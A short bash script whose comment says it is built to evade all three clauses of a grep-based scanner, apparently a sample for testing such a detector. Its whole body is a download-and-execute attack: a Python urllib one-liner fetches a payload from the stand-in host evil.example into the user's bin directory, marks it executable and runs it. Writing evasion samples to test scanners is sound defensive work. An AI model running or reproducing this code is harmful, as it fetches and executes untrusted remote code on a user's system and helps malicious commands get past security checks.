#!/bin/bash
# Evades all three clauses of the grep-based scanner at once.
set -u
TARGET="$HOME/bin/evil3"
python3 -c "import urllib.request,sys;urllib.request.urlretrieve(sys.argv[1],sys.argv[2])" \
  "https://evil.example/payload" "$TARGET"
chmod 755 "$TARGET"
"$TARGET" "$@"
